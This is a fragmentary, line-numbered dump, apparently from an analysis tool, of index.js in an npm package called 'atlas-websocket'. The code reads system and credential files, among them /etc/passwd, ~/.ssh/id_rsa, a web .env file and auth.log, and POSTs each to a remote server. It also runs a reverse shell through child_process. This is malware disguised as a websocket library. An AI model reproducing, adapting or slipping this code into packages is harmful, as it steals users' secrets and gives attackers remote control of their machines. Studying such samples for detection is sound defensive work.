// File: tmp/tmp54fmyggn/atlas-websocket/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const https = require("https")
Line 3: const querystring = require("querystring")
Line 4: _tmp_0 = require("child_process")
Line 11: _tmp_1.push("/etc/passwd")
Line 12: _tmp_1.push("/etc/hosts")
Line 13: _tmp_1.push("/etc/hostname")
Line 14: _tmp_1.push("~/.ssh/id_rsa")
Line 15: _tmp_1.push("/etc/crontab")
Line 16: _tmp_1.push("/var/www/html/.env")
Line 17: _tmp_1.push("/var/log/auth.log")
Line 22: fs.readFile(file, "utf8", (err, data) => {
    if (err) {
      console.error(`Error reading ${file}:`, err);
      return;
    }

    const postData = querystring.stringify({ msg: data });

    const options = {
      hostname: vpsURL,
      port: vpsPort,
      path: `/${file.split('/').pop()}`, // Sends to /passwd, /hosts, etc
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      res.on("data", (d) => {
        process.stdout.write(d);
      });
    });

    req.on("error", (e) => {
      console.error(`Request error for ${file}:`, e);
    });

    req.write(postData);
    req.end();
  })
Line 41: const req = https.request(options, (res) => {
      res.on("data", (d) => {
        process.stdout.write(d);
      });
    })
Line 42: {
        process.stdout.write(d);
      }
Line 43: process.stdout.write(d)
Line 51: req.write(postData)
Line 52: req.end()
Line 62: exec(reverseShell, (error, stdout, stderr) => {
  if (error) {
    console.error(`Reverse shell error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Reverse shell stderr: ${stderr}`);
    return;
  }
  console.log(`Reverse shell stdout: ${stdout}`);
})
